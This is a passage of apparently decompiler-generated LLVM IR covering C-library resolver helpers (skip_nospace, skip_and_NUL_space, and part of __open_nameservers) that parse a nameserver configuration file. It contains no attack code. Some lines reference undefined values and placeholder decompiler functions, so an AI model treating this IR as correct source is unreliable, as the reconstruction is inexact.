  uselistorder i32 %v0_80674f8, { 2, 1, 0 }
  uselistorder i32 %v5_80674eb, { 1, 2, 0 }
  uselistorder i32 %v0_80674e7, { 1, 10, 11, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i1 %v15_806749e, { 1, 0 }
  uselistorder i32 %v3_8067490, { 1, 0, 2, 3 }
  uselistorder i1 %v15_8067487, { 1, 0 }
  uselistorder i32 %v0_806747d, { 8, 2, 3, 4, 5, 1, 0, 6, 7, 9, 10 }
  uselistorder i32 %v1_8067440, { 1, 0 }
  uselistorder i32 %v3_8067439, { 1, 0, 2 }
  uselistorder i1 %v12_8067415, { 1, 0 }
  uselistorder i1 %v12_806740b, { 1, 0 }
  uselistorder i32 %v3_806740b, { 2, 3, 0, 1 }
  uselistorder i1 %v9_80673fc, { 1, 0 }
  uselistorder i32 %v0_80673ef, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_80673e6, { 1, 0 }
  uselistorder i32 %v0_80673d3, { 1, 0 }
  uselistorder i32 %v0_80673a3, { 3, 4, 0, 5, 2, 1, 6 }
  uselistorder i32 %v5_8067378, { 1, 2, 0 }
  uselistorder i32 %v1_8067375, { 1, 0 }
  uselistorder i32 %v2_8067369, { 1, 0 }
  uselistorder i32 %v2_8067344, { 1, 0 }
  uselistorder i32 %v2_806733b, { 1, 0 }
  uselistorder i32 %v2_8067332, { 1, 0 }
  uselistorder i32 %v2_806731e, { 1, 0 }
  uselistorder i32 %v2_806730a, { 1, 0 }
  uselistorder i32 %v2_80672f2, { 1, 0 }
  uselistorder i32 %v0_80672de, { 1, 2, 0, 3 }
  uselistorder i32 %v5_80672b2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v5_8067269, { 1, 2, 0 }
  uselistorder i32 %v3_8067265, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_8067265, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 11, 9, 8 }
  uselistorder i32 %v1_8067247, { 1, 0 }
  uselistorder i32 %v0_8067247, { 0, 2, 1 }
  uselistorder i32 %v1_8067242, { 3, 2, 1, 0 }
  uselistorder i32 %v2_806723f, { 1, 0 }
  uselistorder i32 %v2_806723d, { 1, 2, 0 }
  uselistorder i32 %v1_8067236, { 0, 2, 1 }
  uselistorder i1 %v6_806722c, { 1, 0 }
  uselistorder i32 %v3_8067219, { 0, 4, 2, 3, 1 }
  uselistorder i32 %v0_806723369, { 0, 2, 1 }
  uselistorder i32 %v0_806723b70, { 0, 2, 1 }
  uselistorder i32 %v3_80671ff, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v5_80671a6, { 1, 2, 0 }
  uselistorder i32 %v3_80671a6, { 2, 0, 1, 3 }
  uselistorder i1 %v12_806719a, { 1, 0 }
  uselistorder i1 %v9_8067195, { 1, 0 }
  uselistorder i32 %v3_806718b, { 1, 0, 2, 3 }
  uselistorder i1 %v15_8067178, { 1, 0 }
  uselistorder i32 %v1_8067171, { 0, 2, 1 }
  uselistorder i32 %v0_8067171, { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9 }
  uselistorder i32 %v3_8067153, { 1, 0 }
  uselistorder i32 %v1_806714d, { 1, 0 }
  uselistorder i32 %v1_8067148, { 1, 0 }
  uselistorder i32 %v0_8067145, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_8067125, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8067106, { 1, 0 }
  uselistorder i32 %v0_80670cd, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_80670ae, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v0_806708a, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8067085, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_8067039, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8067028, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_8067003, { 1, 0 }
  uselistorder i32 %v1_8066fbc, { 1, 0 }
  uselistorder i32 %v1_8066fad, { 1, 0 }
  uselistorder i32 %v3_8066f6a, { 1, 0 }
  uselistorder i32 %v1_8066f06, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v13_8066ef0, { 1, 0 }
  uselistorder i32 %v0_8066ef7, { 1, 2, 0, 3 }
  uselistorder i8* %v3_8066fdb, { 1, 2, 0 }
  uselistorder i32 %v3_8066ee8, { 11, 12, 2, 0, 1, 8, 9, 10, 5, 6, 4, 7, 13, 14, 15, 16, 18, 3, 17, 19, 20 }
  uselistorder i32 %v12_8066e4d, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_8066e48, { 5, 6, 7, 8, 9, 10, 11, 4, 12, 3, 13, 2, 16, 15, 14, 17, 0, 1, 18 }
  uselistorder i32 %v2_8066e3e, { 11, 3, 4, 0, 5, 1, 6, 7, 8, 2, 9, 10, 12, 13, 14 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 44, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 53, 45, 46, 47, 51, 48, 49, 50, 0, 52, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86 }
  uselistorder i32* %edx.global-to-local, { 19, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 54, 53, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65 }
  uselistorder i32 59, { 1, 2, 0 }
  uselistorder i32 540, { 1, 0, 2, 3 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 10, 9, 12, 11, 14, 13, 16, 15, 18, 17 }
  uselistorder i32 100, { 1, 5, 3, 4, 2, 0 }
  uselistorder i32 96, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__decode_dotted, { 1, 0 }
  uselistorder i32 -32, { 4, 2, 0, 1, 3, 5, 6 }
  uselistorder i32 84, { 1, 2, 3, 7, 5, 6, 8, 4, 0 }
  uselistorder i8 1, { 27, 28, 24, 30, 26, 5, 2, 0, 31, 29, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 1, 3, 4, 25, 23 }
  uselistorder i32 43, { 6, 7, 8, 2, 3, 4, 5, 1, 0 }
  uselistorder i32 72, { 9, 6, 7, 8, 10, 4, 5, 2, 3, 1, 11, 0 }
  uselistorder i32 372, { 1, 0 }
  uselistorder i32 192, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 68, { 2, 1, 7, 8, 5, 6, 3, 4, 9, 10, 11, 12, 13, 0 }
  uselistorder i32 39, { 1, 4, 2, 3, 0 }
  uselistorder i32 -2, { 7, 17, 8, 16, 2, 0, 18, 19, 9, 1, 15, 21, 22, 3, 5, 4, 23, 20, 6, 10, 11, 12, 13, 14 }
  uselistorder i32 384, { 0, 5, 3, 6, 2, 1, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 4, 3, 2, 0 }
  uselistorder i32 1000, { 0, 3, 1, 2, 4 }
  uselistorder i32 500, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 1, 5, 10, 9, 8, 7, 6, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32 (i32)* @socket, { 0, 7, 6, 5, 4, 3, 2, 1, 8 }
  uselistorder i32 17, { 6, 1, 3, 4, 8, 2, 7, 5, 0 }
  uselistorder i32 532, { 3, 1, 0, 2 }
  uselistorder i32 376, { 3, 2, 4, 1, 0 }
  uselistorder i32 76, { 1, 8, 6, 7, 4, 5, 2, 3, 9, 10, 11, 12, 0 }
  uselistorder i32 356, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 (i32*, i32)* @_pthread_cleanup_pop_restore, { 9, 8, 7, 0, 1, 4, 12, 5, 2, 3, 6, 10, 11 }
  uselistorder i32 428, { 1, 0 }
  uselistorder i32 60, { 24, 25, 6, 7, 26, 27, 16, 8, 19, 20, 21, 22, 10, 11, 23, 17, 18, 14, 12, 2, 13, 15, 3, 9, 4, 1, 28, 29, 30, 31, 32, 5, 0 }
  uselistorder i16 1, { 1, 0 }
  uselistorder i16* @global_var_8071b04.1717, { 1, 0 }
  uselistorder i32 56, { 29, 30, 31, 32, 33, 34, 35, 36, 37, 14, 15, 3, 4, 20, 21, 22, 23, 24, 25, 26, 27, 6, 7, 8, 9, 28, 16, 17, 18, 19, 10, 11, 12, 13, 5, 2, 1, 38, 39, 40, 41, 42, 43, 0 }
  uselistorder i8 46, { 0, 7, 5, 6, 1, 4, 2, 8, 3 }
  uselistorder i32 52, { 15, 16, 17, 18, 2, 19, 20, 10, 11, 4, 5, 13, 6, 14, 12, 7, 8, 9, 3, 23, 24, 1, 21, 22, 25, 0 }
  uselistorder i32 64, { 30, 31, 8, 32, 33, 34, 3, 35, 5, 36, 37, 38, 18, 19, 10, 11, 43, 12, 23, 24, 25, 26, 27, 28, 15, 16, 17, 39, 0, 29, 20, 21, 22, 14, 9, 13, 2, 7, 4, 6, 40, 41, 42, 44, 45, 46, 1 }
  uselistorder i32 (i32)* @__pthread_return_0, { 6, 7, 8, 14, 13, 3, 10, 12, 11, 9, 2, 1, 0, 5, 4 }
  uselistorder i32 (i32*, i32, i32)* @_pthread_cleanup_push_defer, { 9, 8, 7, 0, 1, 4, 12, 5, 2, 3, 6, 10, 11 }
  uselistorder i32 134623208, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 (i32)* @__GI___libc_close, { 14, 13, 12, 15, 21, 20, 19, 18, 17, 16, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 130, { 1, 0 }
  uselistorder label %dec_label_pc_8067598, { 1, 0 }
  uselistorder label %dec_label_pc_806757c, { 1, 0 }
  uselistorder label %dec_label_pc_806755a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8067542, { 1, 0 }
  uselistorder label %dec_label_pc_8067536, { 13, 8, 9, 3, 4, 7, 6, 5, 10, 0, 1, 2, 11, 12 }
  uselistorder label %dec_label_pc_8067528, { 1, 0 }
  uselistorder label %dec_label_pc_80674f8, { 1, 4, 2, 3, 0 }
  uselistorder label %dec_label_pc_80674e7, { 1, 0 }
  uselistorder label %dec_label_pc_80674df, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8067423, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8067381, { 1, 0 }
  uselistorder label %dec_label_pc_8067265, { 1, 0 }
  uselistorder label %dec_label_pc_8067247, { 1, 0 }
  uselistorder label %dec_label_pc_8067219, { 1, 0 }
  uselistorder label %dec_label_pc_8066f97, { 1, 0 }
  uselistorder label %dec_label_pc_8066f6a, { 1, 0 }
  uselistorder label %dec_label_pc_8066f06, { 1, 0 }
}

define i32 @skip_nospace() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80675a8 = load i32, i32* @ebx, align 4
  store i32 %v0_80675a8, i32* %stack_var_-4, align 4
  %v0_80675a9 = load i32, i32* @eax, align 4
  %v4_80675b8.pre = load i32, i32* @ecx, align 4
  store i32 %v0_80675a9, i32* %ebx.global-to-local, align 4
  %v1_80675b87 = inttoptr i32 %v0_80675a9 to i8*
  %v2_80675b88 = load i8, i8* %v1_80675b87, align 1
  %v3_80675b89 = zext i8 %v2_80675b88 to i32
  %v5_80675b810 = and i32 %v4_80675b8.pre, -256
  %v6_80675b811 = or i32 %v3_80675b89, %v5_80675b810
  store i32 %v6_80675b811, i32* @ecx, align 4
  %v4_80675ba12 = icmp eq i8 %v2_80675b88, 0
  br i1 %v4_80675ba12, label %dec_label_pc_80675cc, label %dec_label_pc_80675be.lr.ph

dec_label_pc_80675be.lr.ph:                       ; preds = %entry
  %v0_80675be.pre = load i32, i32* @global_var_8071900, align 256
  br label %dec_label_pc_80675be

dec_label_pc_80675ad:                             ; preds = %dec_label_pc_80675be
  %v10_80675ad = icmp eq i8 %v2_80675b816, 10
  %v1_80675b0 = icmp eq i1 %v10_80675ad, false
  br i1 %v1_80675b0, label %dec_label_pc_80675b7, label %dec_label_pc_80675b2

dec_label_pc_80675b2:                             ; preds = %dec_label_pc_80675ad
  store i8 0, i8* %v1_80675b815, align 1
  %v0_80675cc.pre = load i32, i32* %ebx.global-to-local, align 4
  %v2_80675ce.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80675cc

dec_label_pc_80675b7:                             ; preds = %dec_label_pc_80675ad
  %v1_80675b7 = add i32 %v0_80675b714, 1
  store i32 %v1_80675b7, i32* %ebx.global-to-local, align 4
  %v1_80675b8 = inttoptr i32 %v1_80675b7 to i8*
  %v2_80675b8 = load i8, i8* %v1_80675b8, align 1
  %v3_80675b8 = zext i8 %v2_80675b8 to i32
  %v5_80675b8 = and i32 %v6_80675b818, -256
  %v6_80675b8 = or i32 %v3_80675b8, %v5_80675b8
  store i32 %v6_80675b8, i32* @ecx, align 4
  %v4_80675ba = icmp eq i8 %v2_80675b8, 0
  br i1 %v4_80675ba, label %dec_label_pc_80675cc, label %dec_label_pc_80675be

dec_label_pc_80675be:                             ; preds = %dec_label_pc_80675be.lr.ph, %dec_label_pc_80675b7
  %v6_80675b818 = phi i32 [ %v6_80675b811, %dec_label_pc_80675be.lr.ph ], [ %v6_80675b8, %dec_label_pc_80675b7 ]
  %v3_80675b817 = phi i32 [ %v3_80675b89, %dec_label_pc_80675be.lr.ph ], [ %v3_80675b8, %dec_label_pc_80675b7 ]
  %v2_80675b816 = phi i8 [ %v2_80675b88, %dec_label_pc_80675be.lr.ph ], [ %v2_80675b8, %dec_label_pc_80675b7 ]
  %v1_80675b815 = phi i8* [ %v1_80675b87, %dec_label_pc_80675be.lr.ph ], [ %v1_80675b8, %dec_label_pc_80675b7 ]
  %v0_80675b714 = phi i32 [ %v0_80675a9, %dec_label_pc_80675be.lr.ph ], [ %v1_80675b7, %dec_label_pc_80675b7 ]
  %v2_80675c6 = mul nuw nsw i32 %v3_80675b817, 2
  %v3_80675c6 = add i32 %v0_80675be.pre, %v2_80675c6
  %v4_80675c6 = inttoptr i32 %v3_80675c6 to i8*
  %v5_80675c6 = load i8, i8* %v4_80675c6, align 1
  %v6_80675c6 = and i8 %v5_80675c6, 32
  %v7_80675c6 = icmp eq i8 %v6_80675c6, 0
  br i1 %v7_80675c6, label %dec_label_pc_80675ad, label %dec_label_pc_80675cc

dec_label_pc_80675cc:                             ; preds = %entry, %dec_label_pc_80675b7, %dec_label_pc_80675be, %dec_label_pc_80675b2
  %v2_80675ce = phi i32 [ %v2_80675ce.pre, %dec_label_pc_80675b2 ], [ %v0_80675a8, %dec_label_pc_80675be ], [ %v0_80675a8, %dec_label_pc_80675b7 ], [ %v0_80675a8, %entry ]
  %v0_80675cc = phi i32 [ %v0_80675cc.pre, %dec_label_pc_80675b2 ], [ %v0_80675b714, %dec_label_pc_80675be ], [ %v1_80675b7, %dec_label_pc_80675b7 ], [ %v0_80675a9, %entry ]
  store i32 %v2_80675ce, i32* @ebx, align 4
  ret i32 %v0_80675cc

; uselistorder directives
  uselistorder i32 %v1_80675b7, { 0, 3, 2, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80675cc, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_80675be, { 1, 0 }
}

define i32 @skip_and_NUL_space() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_80675d0 = load i32, i32* @ebx, align 4
  store i32 %v0_80675d0, i32* %stack_var_-4, align 4
  %v0_80675d1 = load i32, i32* @eax, align 4
  %v4_80675d3.pre = load i32, i32* @ecx, align 4
  store i32 %v0_80675d1, i32* %ebx.global-to-local, align 4
  %v1_80675d33 = inttoptr i32 %v0_80675d1 to i8*
  %v2_80675d34 = load i8, i8* %v1_80675d33, align 1
  %v3_80675d35 = zext i8 %v2_80675d34 to i32
  %v5_80675d36 = and i32 %v4_80675d3.pre, -256
  %v6_80675d37 = or i32 %v3_80675d35, %v5_80675d36
  store i32 %v6_80675d37, i32* @ecx, align 4
  %v4_80675d58 = icmp eq i8 %v2_80675d34, 0
  store i1 %v4_80675d58, i1* %zf.global-to-local, align 1
  br i1 %v4_80675d58, label %dec_label_pc_80675f7, label %dec_label_pc_80675d9

dec_label_pc_80675d9:                             ; preds = %entry, %dec_label_pc_80675f4
  %v3_80675d312 = phi i32 [ %v3_80675d3, %dec_label_pc_80675f4 ], [ %v3_80675d35, %entry ]
  %v2_80675d311 = phi i8 [ %v2_80675d3, %dec_label_pc_80675f4 ], [ %v2_80675d34, %entry ]
  %v1_80675d310 = phi i8* [ %v1_80675d3, %dec_label_pc_80675f4 ], [ %v1_80675d33, %entry ]
  %v0_80675d9 = load i32, i32* @global_var_8071900, align 256
  %v2_80675e1 = mul nuw nsw i32 %v3_80675d312, 2
  %v3_80675e1 = add i32 %v0_80675d9, %v2_80675e1
  %v4_80675e1 = inttoptr i32 %v3_80675e1 to i8*
  %v5_80675e1 = load i8, i8* %v4_80675e1, align 1
  %v6_80675e1 = and i8 %v5_80675e1, 32
  %v7_80675e1 = icmp eq i8 %v6_80675e1, 0
  store i1 %v7_80675e1, i1* %zf.global-to-local, align 1
  br i1 %v7_80675e1, label %dec_label_pc_80675f7, label %dec_label_pc_80675e7

dec_label_pc_80675e7:                             ; preds = %dec_label_pc_80675d9
  %v10_80675e7 = icmp eq i8 %v2_80675d311, 10
  store i1 %v10_80675e7, i1* %zf.global-to-local, align 1
  store i8 0, i8* %v1_80675d310, align 1
  %v0_80675ed = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80675ed, label %dec_label_pc_80675f7, label %dec_label_pc_80675ef

dec_label_pc_80675ef:                             ; preds = %dec_label_pc_80675e7
  %v0_80675ef = load i32, i32* @ecx, align 4
  %v1_80675ef = trunc i32 %v0_80675ef to i8
  %v10_80675ef = icmp eq i8 %v1_80675ef, 35
  store i1 %v10_80675ef, i1* %zf.global-to-local, align 1
  br i1 %v10_80675ef, label %dec_label_pc_80675f7, label %dec_label_pc_80675f4

dec_label_pc_80675f4:                             ; preds = %dec_label_pc_80675ef
  %v0_80675f4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80675f4 = add i32 %v0_80675f4, 1
  %v8_80675f4 = icmp eq i32 %v1_80675f4, 0
  store i1 %v8_80675f4, i1* %zf.global-to-local, align 1
  store i32 %v1_80675f4, i32* %ebx.global-to-local, align 4
  %v1_80675d3 = inttoptr i32 %v1_80675f4 to i8*
  %v2_80675d3 = load i8, i8* %v1_80675d3, align 1
  %v3_80675d3 = zext i8 %v2_80675d3 to i32
  %v5_80675d3 = and i32 %v0_80675ef, -256
  %v6_80675d3 = or i32 %v3_80675d3, %v5_80675d3
  store i32 %v6_80675d3, i32* @ecx, align 4
  %v4_80675d5 = icmp eq i8 %v2_80675d3, 0
  store i1 %v4_80675d5, i1* %zf.global-to-local, align 1
  br i1 %v4_80675d5, label %dec_label_pc_80675f7, label %dec_label_pc_80675d9

dec_label_pc_80675f7:                             ; preds = %dec_label_pc_80675f4, %dec_label_pc_80675d9, %dec_label_pc_80675e7, %dec_label_pc_80675ef, %entry
  %v0_80675f7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80675f9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80675f9, i32* @ebx, align 4
  ret i32 %v0_80675f7

; uselistorder directives
  uselistorder i32 %v3_80675d3, { 1, 0 }
  uselistorder i8 %v2_80675d3, { 1, 2, 0 }
  uselistorder i8* %v1_80675d3, { 1, 0 }
  uselistorder i32 %v1_80675f4, { 1, 0, 2 }
  uselistorder i1 %v10_80675ef, { 1, 0 }
  uselistorder i1* %zf.global-to-local, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i8 10, { 0, 1, 12, 13, 14, 15, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 16 }
  uselistorder i8 32, { 12, 11, 13, 16, 0, 7, 17, 14, 15, 8, 9, 10, 18, 19, 20, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* @global_var_8071900, { 4, 0, 1, 5, 6, 2, 3 }
  uselistorder label %dec_label_pc_80675f7, { 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_80675d9, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-540 = alloca i32, align 4
  %v15_80675ff = ptrtoint i32* %stack_var_-540 to i32
  %v0_8067605 = load i32, i32* @global_var_8078c78.1722, align 8
  %v1_8067605 = icmp eq i32 %v0_8067605, 0
  %v1_806760c = icmp eq i1 %v1_8067605, false
  br i1 %v1_806760c, label %dec_label_pc_806764b, label %dec_label_pc_806760e

dec_label_pc_806760e:                             ; preds = %entry
  %v0_806760e = load i32, i32* @eax, align 4
  %v2_8067610 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8067610, i32* %eax.global-to-local, align 4
  %v6_806761d = call i32 @__GI_stat(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_80703e0.1723, i32 0, i32 0), i32 %v2_8067610, i32 %v0_806760e, i32 %v0_806760e)
  store i32 %v6_806761d, i32* @eax, align 4
  %v1_8067627 = icmp eq i32 %v6_806761d, 0
  %v6_8067629 = select i1 %v1_8067627, i32 %tmp20, i32 0
  %v0_8067631 = load i32, i32* @global_var_8078860.1724, align 32
  %v12_8067631 = icmp eq i32 %v0_8067631, %v6_8067629
  br i1 %v12_8067631, label %dec_label_pc_806764b, label %dec_label_pc_8067640

dec_label_pc_8067640:                             ; preds = %dec_label_pc_806760e
  store i32 %v6_8067629, i32* @global_var_8078860.1724, align 32
  %v1_8067646 = call i32 @__close_nameservers(i32 %v6_8067629)
  store i32 %v1_8067646, i32* @eax, align 4
  br label %dec_label_pc_806764b

dec_label_pc_806764b:                             ; preds = %dec_label_pc_806760e, %entry, %dec_label_pc_8067640
  %v0_806764b = load i64, i64* @global_var_8078c84.1719, align 8
  %v1_806764b = trunc i64 %v0_806764b to i32
  %v2_806764b = icmp eq i32 %v1_806764b, 0
  %v1_8067652 = icmp eq i1 %v2_806764b, false
  br i1 %v1_8067652, label %dec_label_pc_80679a8, label %dec_label_pc_8067658

dec_label_pc_8067658:                             ; preds = %dec_label_pc_806764b
  store i8 5, i8* bitcast (i64* @global_var_8071b08.1721 to i8*), align 8
  store i8 3, i8* bitcast (i8** @global_var_8071b09 to i8*), align 4
  %v3_8067672 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_80703e0.1723 to i32), i32 ptrtoint (i32* @global_var_80703fa.1671 to i32))
  store i32 %v3_8067672, i32* %eax.global-to-local, align 4
  %v1_806767e = icmp eq i32 %v3_8067672, 0
  %v1_8067680 = icmp eq i1 %v1_806767e, false
  br i1 %v1_8067680, label %dec_label_pc_80678af, label %dec_label_pc_80678eb

dec_label_pc_806768b:                             ; preds = %dec_label_pc_80678ba
  %v1_806768b = add i32 %v0_80678d1, 296
  store i32 %v1_806768b, i32* @eax, align 4
  %v0_8067692 = call i32 @skip_and_NUL_space()
  store i32 %v0_8067692, i32* @eax, align 4
  store i32 %v0_8067692, i32* @esi, align 4
  %v0_8067699 = call i32 @skip_nospace()
  store i32 %v0_8067699, i32* @eax, align 4
  %v0_806769e = call i32 @skip_and_NUL_space()
  store i32 %v0_806769e, i32* @eax, align 4
  %v1_80676a3 = ptrtoint i8* %.0 to i32
  %v2_80676a3 = load i32, i32* @esp, align 4
  %v3_80676a3 = add i32 %v2_80676a3, -4
  %v4_80676a3 = inttoptr i32 %v3_80676a3 to i32*
  store i32 %v1_80676a3, i32* %v4_80676a3, align 4
  %v3_80676a4 = add i32 %v2_80676a3, -8
  %v4_80676a4 = inttoptr i32 %v3_80676a4 to i32*
  store i32 %v1_80676a3, i32* %v4_80676a4, align 4
  %v1_80676a5 = add i32 %v2_80676a3, -12
  %v2_80676a5 = inttoptr i32 %v1_80676a5 to i32*
  store i32 ptrtoint ([11 x i8]* @global_var_80703f1.1725 to i32), i32* %v2_80676a5, align 4
  %v0_80676aa = load i32, i32* @esi, align 4
  %v2_80676aa = add i32 %v2_80676a3, -16
  %v3_80676aa = inttoptr i32 %v2_80676aa to i32*
  store i32 %v0_80676aa, i32* %v3_80676aa, align 4
  store i32 %v0_806769e, i32* @ebp, align 4
  %v3_80676ad = call i32 @__GI_strcoll(i8* %v2_80676ad, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80676ad, i32* @eax, align 4
  %v0_80676b2 = load i32, i32* @esp, align 4
  %v1_80676b5 = icmp eq i32 %v3_80676ad, 0
  store i32 %v3_80676ad, i32* @ebx, align 4
  %v1_80676b9 = icmp eq i1 %v1_80676b5, false
  br i1 %v1_80676b9, label %dec_label_pc_806777e, label %dec_label_pc_80676bf

dec_label_pc_80676bf:                             ; preds = %dec_label_pc_806768b
  %v0_80676bf = load i32, i32* @ebp, align 4
  store i32 %v0_80676bf, i32* @eax, align 4
  %v0_80676c1 = call i32 @skip_nospace()
  %v1_80676c1 = inttoptr i32 %v0_80676c1 to i8*
  store i8 0, i8* %v1_80676c1, align 1
  %v0_80676ce = load i32, i32* @ebx, align 4
  store i32 %v0_80676ce, i32* %eax.global-to-local, align 4
  %v0_80676d0 = load i32, i32* @esp, align 4
  %v1_80676d0 = add i32 %v0_80676d0, 4
  %v2_80676d0 = inttoptr i32 %v1_80676d0 to i32*
  %v3_80676d0 = load i32, i32* %v2_80676d0, align 4
  %v4_80676d0 = inttoptr i32 %v3_80676d0 to i8*
  store i32 %v3_80676d0, i32* @edi, align 4
  %v5_80676d4 = call i8* @_memset(i8* %v4_80676d0, i32 %v0_80676ce, i32 7)
  %v6_80676d4 = ptrtoint i8* %v5_80676d4 to i32
  store i32 %v6_80676d4, i32* @ecx, align 4
  %v0_80676d6 = load i32, i32* @esi, align 4
  %v1_80676d6 = load i32, i32* @esp, align 4
  %v2_80676d6 = add i32 %v1_80676d6, -4
  %v3_80676d6 = inttoptr i32 %v2_80676d6 to i32*
  store i32 %v0_80676d6, i32* %v3_80676d6, align 4
  %v1_80676d7 = add i32 %v1_80676d6, 504
  store i32 %v1_80676d7, i32* %eax.global-to-local, align 4
  %v2_80676de = add i32 %v1_80676d6, -8
  %v3_80676de = inttoptr i32 %v2_80676de to i32*
  store i32 %v1_80676d7, i32* %v3_80676de, align 4
  %v0_80676df = load i32, i32* @ebp, align 4
  %v2_80676df = add i32 %v1_80676d6, -12
  %v3_80676df = inttoptr i32 %v2_80676df to i32*
  store i32 %v0_80676df, i32* %v3_80676df, align 4
  %v1_80676e0 = add i32 %v1_80676d6, -16
  %v2_80676e0 = inttoptr i32 %v1_80676e0 to i32*
  store i32 10, i32* %v2_80676e0, align 4
  %v3_80676e2 = call i32 @inet_pton(i32 %v3_8067672, i8* bitcast (i32* @0 to i8*))
  store i32 %v3_80676e2, i32* %eax.global-to-local, align 4
  %v0_80676e7 = load i32, i32* @esp, align 4
  %tmp32 = icmp slt i32 %v3_80676e2, 1
  br i1 %tmp32, label %dec_label_pc_80676fa, label %dec_label_pc_80676ee

dec_label_pc_80676ee:                             ; preds = %dec_label_pc_80676bf
  %v1_80676ee = add i32 %v0_80676e7, 512
  %v2_80676ee = inttoptr i32 %v1_80676ee to i16*
  store i16 10, i16* %v2_80676ee, align 2
  br label %dec_label_pc_8067720

dec_label_pc_80676fa:                             ; preds = %dec_label_pc_80676bf
  %v0_80676fa = load i32, i32* @ebx, align 4
  %v2_80676fa = add i32 %v0_80676e7, 12
  %v3_80676fa = inttoptr i32 %v2_80676fa to i32*
  store i32 %v0_80676fa, i32* %v3_80676fa, align 4
  %v1_80676fb = add i32 %v0_80676e7, 516
  store i32 %v1_80676fb, i32* %eax.global-to-local, align 4
  %v2_8067702 = add i32 %v0_80676e7, 8
  %v3_8067702 = inttoptr i32 %v2_8067702 to i32*
  store i32 %v1_80676fb, i32* %v3_8067702, align 4
  %v0_8067703 = load i32, i32* @ebp, align 4
  %v2_8067703 = add i32 %v0_80676e7, 4
  %v3_8067703 = inttoptr i32 %v2_8067703 to i32*
  store i32 %v0_8067703, i32* %v3_8067703, align 4
  %v2_8067704 = inttoptr i32 %v0_80676e7 to i32*
  store i32 2, i32* %v2_8067704, align 4
  %v3_8067706 = call i32 @inet_pton(i32 %v3_8067672, i8* bitcast (i32* @0 to i8*))
